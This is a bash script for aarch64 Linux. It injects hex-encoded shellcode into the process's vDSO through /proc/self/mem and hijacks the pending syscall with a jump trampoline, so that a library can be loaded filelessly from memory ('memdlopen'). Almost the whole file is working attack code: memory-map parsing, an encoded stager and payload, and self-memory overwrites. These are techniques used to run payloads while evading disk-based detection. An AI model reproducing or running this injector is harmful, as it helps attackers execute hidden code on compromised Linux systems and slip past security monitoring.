### Script to run filelessly the memdlopen shellcode

endian()
{
    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
}

stager="c81b80d2620080d2430480d204008092050080d2f3020010730240b9e10313aa000080d2010000d4f40300aae20301aae10300aae80780d2800080d2010000d42100008b420000eb81ffff54481c80d2e00314aae10313aaa20080d2010000d4800080d2280780d2010000d480021fd6"
sc="600080d2e1018092220080d2c80780d2010000d4600080d2b335007061c20091020280d2080880d2010000d4600080d2280780d2010000d4000080d2010082d2620080d2430480d204008092050080d2c81b80d2010000d4fb0300aa140080d208000014e0031baae10314aa82064091230080d2081b80d2010000d4fb0300aa020082d20100148b000080d2e80780d2010000d4a012f8b79402008b1f0440f120feff54791640f93b831ff834831df83fff3ea9690f40f929031ef8690080d22920007920290010e1031baa2c010094800100b400001b8b0928c1a86bff9fd2ebffadf23f010beb80000054214000f141ffff5403000014ea0365b30a801ff8490180d2ff7fbfa9290500f1c1ffff54c9120010e90300f9800080d2e1030091020080d2030180d2c81080d2010000d46a0240f9690640f9410109cb620080d2e00309aa481c80d2010000d47c000094410109cba20080d2e00309aa010000d4120080925f0a00f1800d00545206009141240010510480d24106119b600c8092020080d2080780d2010000d4c0feffb7e40300aa010080d2420080d2c80780d2010000d4050080d2430080d2620080d2e10300aa000080d2c81b80d2010000d4e30300aae00304aa280780d2010000d4e10303aa20200010e90000940500038be10303aae01f0010e50000940400038b0a200030898441b82901058bd90000948b0000b4216000f161ffff54d6ffff1789005ff843260070637872f86300098b801d0010412080d260003fd6a00600b4f3240070791640f920835ff821835df8e81a80d2010000d4050080d2040080924300a0d2430480d2620080d2210480d221cc74d3000080d2c81b80d2010000d40000018b2d835ef8712240f91f801ff8006000d1000c11cb00ec7c92110000f91f000091110100b473220191138c00f8310600f1800000546116403881ffff34feffff171ffc00a9400080d2010080d2020080d2080380d2010000d4200300102d035ef82c835ef8ad010c8ba0011fd6dabafa0000000000e20380d2211e0010200080d2080880d2010000d40d000014e20380d2211b0030200080d2080880d2010000d407000014020580d2611b0010200080d2080880d2010000d401000014000080d2c80b80d2010000d4e00309aa0180bad2210040b205000014024440b85f00016b410000541fc01fb81f000aeb63ffff54c0035fd6e91f41f929110091e91f01f9e08753a9e28f54a9e49755a9e8bf40f9531a0070791640f9eb6682d21ffd00f1800100541f7903f1400300541fe100f1000700541f4101f1000900541f3d01f1e00800541fe500f1400c0054650000141f000beb610c00540b0080d234835ff835035ff88c02158b7f0102eba00000548a696b382a682b386b050091fbffff17e29f00f9b502028b35031ff8c0035fd69f000beb610a0054ed0302aaee0305aa620080d263007c924b0480d263000baa04008092050080d2010000d44e0000b520831ef8e09f00f92b000e8b33835df87f0113eb4900005473020ecb0b0080d234835ff88c020e8b7f0113eba00000548a696b380a682b386b050091fbffff17e2030daa481c80d2010000d4c0035fd6e90301aa2c154038ecffffb5290500d12cfd5f389fbd00f1c1ffff54290500916a090010fa031eaa2d000094fe031aaa0b0500b5150080d235031ff8e06682d2e09f00f9c0035fd6e20301aa1f000beb01040054a9d5bbd2e9dd97f2490000f9c95fb9d2c95797f2490400f9290080d2490800f9a93d90d2491800b95fc001f85f1400f933835df8531800f9090082d2491c00f90a4080d2690aca9a2acd0a9b4a0000b429050091492000f95ffc04a95ffc05a95ffc06a9ff9f00f9c0035fd61f000beb61000054ff9f00f9c0035fd6010000d4e09f00f9c0035fd6ef030aaaec1540382b1540386b010ceb410000548cffffb5c0035fd6341440f935784079367c40799402018b971a168bf60e40f9d602018be8031eaaea0300aa890240b92901168beeffff97cb0000b4b50600f19402019141ffff54000080d200011fd6811240f9800e40f900011fd66c696261736466002e64796e737472002e64796e73796d002e64796e616d696300646c6f70656e002f6c69622f616172636836342d6c696e75782d676e752f6c6962632e736f2e3600002f6c69622f616172636836342d6c696e75782d676e752f6c6962646c2e736f2e32002f6c69622f616172636836342d6c696e75782d676e752f6c642d6c696e75782d616172636836342e736f2e31006d656d646c6f70656e3a204572726f72207768696c65206c6f6164696e670a6d656d646c6f70656e3a204572726f722c20636f756c64206e6f742066696e6420646c6f70656e0a6d656d646c6f70656e3a204572726f72207768696c652072656164696e670a"

maps=$(cat /proc/$$/maps)

ld_start_addr=$(echo "$maps" | grep "ld-" | grep " r-xp " | cut -d' ' -f1)
ld_end_addr=0000$(echo $ld_start_addr | cut -d'-' -f2)
sc=$sc$(endian $ld_end_addr)
ld_start_addr=0000$(echo $ld_start_addr | cut -d'-' -f1)
sc=$sc$(endian $ld_start_addr)

libc=$(echo "$maps" | grep "libc")
libc=0000$(echo $libc | cut -d'-' -f1)
sc=$sc$(endian $libc)

libdl=$(echo "$maps" | grep "libdl")
if [ -z "$libdl" ]
then
    libdl=0000000000000000
else
    libdl=0000$(echo $libdl | cut -d'-' -f1)
fi
sc=$sc$(endian $libdl)

ld=$(echo "$maps" | grep "ld-")
ld=0000$(echo $ld | cut -d'-' -f1)
sc=$sc$(endian $ld)

stack_top=$(echo "$maps" | grep -F "[stack]")
stack_top=0000$(echo $stack_top | cut -d' ' -f1 | cut -d'-' -f2)
sc=$sc$(endian $stack_top)

# The shellcode will be written into the vDSO
sc_addr=0000$(echo "$maps" | grep -F "[vdso]" | cut -d'-' -f1)
# Trampoline to jump to the shellcode
jmp="4000005800001fd6"$(endian $sc_addr)
sc_addr=$((0x$sc_addr))

read syscall_info < /proc/self/syscall
addr=$(printf "%u" $(echo $syscall_info | cut -d' ' -f9))
exec 3</proc/self/mem
dd bs=1 skip=$addr count=0 <&3 >/dev/null 2>&1
original=$(od -v -t x1 -N 16 <&3 | head -n -1 |\
           cut -d' ' -f 2- | tr -d ' \n')
sc=$sc$original
exec 3>&-
args=""
for arg in "$@"
do
    args=$args$(printf "%s" "$arg" | od -v -t x1 | head -n -1 |\
                cut -d' ' -f 2- | tr -d ' \n')00
done
sc=$sc$(endian $(printf %016x $#))$args

stager=$stager$(endian $(printf %016x $((${#sc} / 2))))
stager=$(printf $stager | sed -e 's/../\\x&/g')
jmp=$(printf $jmp | sed -e 's/../\\x&/g')
sc=$(printf $sc | sed -e 's/../\\x&/g')

exec 4< <(printf $sc)
exec 3>/proc/self/mem

# Overwrite vDSO with our shellcode
dd bs=1 skip=$sc_addr <&3 >/dev/null 2>&1
printf $stager >&3

exec 3>&-
exec 3>/proc/self/mem

# Write jump instruction where it will be found shortly
dd bs=1 skip=$addr <&3 >/dev/null 2>&1
printf $jmp >&3
